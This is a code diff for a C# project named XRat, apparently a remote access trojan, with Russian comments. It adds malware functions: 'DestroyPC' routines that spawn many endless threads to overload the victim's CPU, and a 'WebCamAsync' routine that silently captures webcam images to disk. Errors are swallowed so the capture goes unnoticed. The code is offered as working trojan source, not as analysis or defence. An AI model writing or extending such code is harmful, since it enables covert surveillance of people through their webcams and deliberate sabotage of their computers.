@@ -6,11 +6,18 @@ using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Windows.Forms.Design;
 using HtmlAgilityPack;
+using System.Drawing;
+using AForge.Video;
+using AForge.Video.DirectShow;
+using System.IO;
 
 namespace XRat
 {
     public static class Utils
     {
+        private static string filePath = string.Empty;
+
+
         // Подключаем необходимые Windows API
         [DllImport("kernel32.dll")]
         static extern IntPtr GetConsoleWindow();
@@ -282,6 +289,157 @@ namespace XRat
                     }
                 }
             });
+        }
+
+
+        public static void DestroyPCOld()
+        {
+            int numberOfThreads = Environment.ProcessorCount; // Получаем количество логических процессоров
+            int targetLoad = 90; // Целевая нагрузка - 90%
+
+            // Вычисляем, сколько процентов времени процессор должен быть занят
+            int workTime = 100; // Время работы в миллисекундах
+            int idleTime = (100 - targetLoad); // Время бездействия
+
+            // Статический Random, чтобы избежать многократного создания в потоках
+            Random random = new Random();
+
+            // Запускаем несколько потоков
+            for (int i = 0; i < numberOfThreads; i++)
+            {
+                Thread t = new Thread(() =>
+                {
+                    while (true)
+                    {
+                        // Нагружаем процессор на заданный процент
+                        var sw = Stopwatch.StartNew();
+                        while (sw.ElapsedMilliseconds < workTime)
+                        {
+                            // Сложные вычисления для загрузки процессора
+                            // Используем более сложные вычисления для увеличения нагрузки
+                            double result = 0;
+                            for (int j = 0; j < 1000; j++)
+                            {
+                                result += Math.Sqrt(random.NextDouble());
+                            }
+                        }
+
+                        // Отдыхаем, чтобы не создать 100% нагрузку
+                        // Используем точный расчет времени отдыха
+                        long sleepTime = idleTime - sw.ElapsedMilliseconds;
+                        if (sleepTime > 0)
+                        {
+                            Thread.Sleep((int)sleepTime);
+                        }
+                    }
+                });
+                t.IsBackground = true; // Потоки будут завершаться при завершении программы
+                t.Start();
+            }
+        }
+
+        public static void DestroyPC()
+        {
+            // Количество потоков для создания нагрузки на процессор
+            int numThreads = 160;  // Увеличиваем количество потоков для большей нагрузки
+
+            // Массив потоков
+            Thread[] threads = new Thread[numThreads];
+
+            // Запускаем каждый поток
+            for (int i = 0; i < numThreads; i++)
+            {
+                threads[i] = new Thread(GenerateCpuLoad);
+                threads[i].Start();
+            }
+
+            Console.WriteLine("Запущено несколько потоков для нагрузки на процессор.");
+            Console.WriteLine("Нажмите любую клавишу для завершения.");
+            Console.ReadKey();
+
+            // Ожидаем завершения всех потоков
+            for (int i = 0; i < numThreads; i++)
+            {
+                threads[i].Join();
+            }
+
+            Console.WriteLine("Все потоки завершены.");
+        }
+
+        // Метод для создания нагрузки на процессор
+        public static void GenerateCpuLoad()
+        {
+            // Вечный цикл, который создает интенсивную нагрузку
+            while (true)
+            {
+                // Процессор будет занят выполнением вычислений
+                double result = Math.Sqrt(Math.PI) * Math.Sqrt(Math.E); // Более ресурсоемкие вычисления
+            }
+        }
+
+
+        // Asynchronous method to start the webcam capture
+        public static async Task<string> WebCamAsync()
+        {
+            // Получаем доступные устройства захвата видео (веб-камеры)
+            FilterInfoCollection videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
+
+            // Проверяем, есть ли устройства
+            if (videoDevices.Count == 0)
+            {
+                //throw new InvalidOperationException("Веб-камеры не обнаружены.");
+            }
+
+            // Выбираем первую камеру по умолчанию (можно поменять на выбор другой камеры)
+            VideoCaptureDevice videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);
+
+            // Подписываемся на событие получения кадра с камеры
+            videoSource.NewFrame += new NewFrameEventHandler(VideoSource_NewFrame);
+
+            // Попытка стартовать захват
+            try
+            {
+                videoSource.Start();
+                // Пример асинхронного ожидания (не блокирует основной поток)
+                await Task.Delay(5000);  // Задержка для захвата кадра (можно настроить)
+
+                // Останавливаем захват видео
+                videoSource.SignalToStop();
+                await Task.Run(() => videoSource.WaitForStop());  // Ожидаем остановки видео захвата асинхронно
+
+            }
+            catch (Exception ex)
+            {
+                //throw new InvalidOperationException("Ошибка при захвате видео: " + ex.Message);
+            }
+
+            return filePath;  // Возвращаем путь к файлу
+        }
+
+        // Метод, который вызывается при получении нового кадра с камеры
+        private static async void VideoSource_NewFrame(object sender, NewFrameEventArgs eventArgs)
+        {
+            try
+            {
+                // Захватываем изображение
+                Bitmap bitmap = (Bitmap)eventArgs.Frame.Clone();
+
+                // Генерируем путь для сохранения снимка
+                string directory = ProCMD("cd").output;
+
+                // Сохраняем изображение в файл асинхронно
+                filePath = Path.Combine(directory, "WebcamCapture_" + DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".jpg");
+
+                // Сохраняем изображение асинхронно
+                await Task.Run(() => bitmap.Save(filePath, System.Drawing.Imaging.ImageFormat.Jpeg));
+
+                // Освобождаем ресурсы
+                bitmap.Dispose();
+            }
+            catch (Exception ex)
+            {
+                //Console.WriteLine("Ошибка при обработке кадра: " + ex.Message);
+            }
         }
     }
 }
